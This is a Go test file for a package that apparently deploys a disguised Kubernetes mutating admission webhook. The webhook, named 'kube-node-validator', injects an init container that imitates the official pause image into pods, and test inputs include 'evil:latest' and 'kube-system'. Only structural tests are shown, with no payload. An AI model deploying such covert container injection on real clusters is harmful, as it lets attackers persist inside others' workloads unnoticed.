package webhook

import (
	"encoding/json"
	"testing"
)

func TestWebhookResultJSON(t *testing.T) {
	result := &WebhookResult{
		Action:    "deploy",
		Name:      "kube-node-validator",
		Namespace: "default",
		Image:     "k8s.gcr.io/pause:3.9-init",
		Status:    "configured",
		Detail:    "webhook deployed",
	}

	data, err := json.Marshal(result)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}

	var decoded WebhookResult
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	if decoded.Action != "deploy" {
		t.Errorf("action = %q, want deploy", decoded.Action)
	}
	if decoded.Namespace != "default" {
		t.Errorf("namespace = %q, want default", decoded.Namespace)
	}
}

func TestGenerateWebhookConfig(t *testing.T) {
	config, err := generateWebhookConfig("kube-system", "evil:latest")
	if err != nil {
		t.Fatalf("generateWebhookConfig: %v", err)
	}

	if config.Name != "kube-node-validator" {
		t.Errorf("name = %q", config.Name)
	}
	if config.Namespace != "kube-system" {
		t.Errorf("namespace = %q", config.Namespace)
	}
	if config.CAKey == nil {
		t.Error("CAKey is nil")
	}
	if len(config.CACert) == 0 {
		t.Error("CACert is empty")
	}
}

func TestGenerateMutationPayload(t *testing.T) {
	payload := GenerateMutationPayload("k8s.gcr.io/pause:3.9-init")

	if payload["op"] != "add" {
		t.Errorf("op = %q, want add", payload["op"])
	}
	if payload["path"] != "/spec/initContainers/-" {
		t.Errorf("path = %q", payload["path"])
	}

	value, ok := payload["value"].(map[string]interface{})
	if !ok {
		t.Fatal("value is not a map")
	}
	if value["name"] != "node-validator" {
		t.Errorf("name = %q", value["name"])
	}
	if value["image"] != "k8s.gcr.io/pause:3.9-init" {
		t.Errorf("image = %q", value["image"])
	}
}

func TestDeployStructure(t *testing.T) {
	err := Deploy("default", "evil:latest", "")
	if err != nil {
		t.Fatalf("Deploy: %v", err)
	}
}

func TestRemoveStructure(t *testing.T) {
	err := Remove("default", "")
	if err != nil {
		t.Fatalf("Remove: %v", err)
	}
}
